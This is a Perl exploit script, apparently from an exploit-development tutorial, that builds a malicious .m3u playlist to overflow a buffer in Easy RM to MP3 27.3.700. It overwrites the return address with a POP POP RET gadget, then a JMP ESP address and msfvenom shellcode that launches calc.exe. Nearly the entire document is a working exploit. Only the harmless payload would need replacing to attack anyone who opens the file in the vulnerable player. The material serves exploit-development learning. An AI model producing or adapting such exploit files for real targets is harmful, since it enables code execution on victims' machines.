#
##
##
#Exploit for Easy RM to MP3 27.3.700 Vulnerability, discovered by Crazy_Hacker
#Originally written by Peter Van Eeckhoutte, http://corelan.be
#
#This exploit is practice for learning shellcode jumping techniques: POP POP RET
#
#Tested on Windows XP SP3


my $file= "popret.m3u";
my $junk= "\x41" x26087;
my $eip= pack('V', 0x01AC6A10); 				#The location of a POP POP RET in MSRMCcodec00.dll
my $jmpesp = pack('V', 0x01CDF23A);				#The location of a JMP ESP instruction in MSRMCcodec02.dll

my $prependesp = "XXXX"; 					#Add 4 bytes so ESP points at beginning of shellcode


my $shellcode = "\x90" x8; 					#add 8 bytes
$shellcode = $shellcode . $jmpesp; 				#Address to return via POP POP RET (JMP ESP)
$shellcode = $shellcode .  "\x90" x50;				#real shellcode



#msfvenom -p windows/exec CMD=calc.exe -b "x00" -f perl EXITFUNC=seh


$shellcode = $shellcode .
"\xb8\xcb\x86\xcf\xfe\xdb\xdc\xd9\x74\x24\xf4\x5f\x31\xc9" .
"\xb1\x30\x31\x47\x13\x03\x47\x13\x83\xef\x37\x64\x3a\x02" .
"\x2f\xeb\xc5\xfb\xaf\x8c\x4c\x1e\x9e\x8c\x2b\x6a\xb0\x3c" .
"\x3f\x3e\x3c\xb6\x6d\xab\xb7\xba\xb9\xdc\x70\x70\x9c\xd3" .
"\x81\x29\xdc\x72\x01\x30\x31\x55\x38\xfb\x44\x94\x7d\xe6" .
"\xa5\xc4\xd6\x6c\x1b\xf9\x53\x38\xa0\x72\x2f\xac\xa0\x67" .
"\xe7\xcf\x81\x39\x7c\x96\x01\xbb\x51\xa2\x0b\xa3\xb6\x8f" .
"\xc2\x58\x0c\x7b\xd5\x88\x5d\x84\x7a\xf5\x52\x77\x82\x31" .
"\x54\x68\xf1\x4b\xa7\x15\x02\x88\xda\xc1\x87\x0b\x7c\x81" .
"\x30\xf0\x7d\x46\xa6\x73\x71\x23\xac\xdc\x95\xb2\x61\x57" .
"\xa1\x3f\x84\xb8\x20\x7b\xa3\x1c\x69\xdf\xca\x05\xd7\x8e" .
"\xf3\x56\xb8\x6f\x56\x1c\x54\x7b\xeb\x7f\x32\x7a\x79\xfa" .
"\x70\x7c\x81\x05\x24\x15\xb0\x8e\xab\x62\x4d\x45\x88\x93" .
"\xbc\x54\x04\x03\x67\x0d\x65\x49\x98\xfb\xa9\x74\x1b\x0e" .
"\x51\x83\x03\x7b\x54\xcf\x83\x97\x24\x40\x66\x98\x9b\x61" .
"\xa3\xfb\x7a\xf2\x2f\xfc";



open($FILE,">$file");
print $FILE $junk.$eip.$prependesp.$shellcode;
close($FILE);
print "m3u file successfully created here: "."$file";
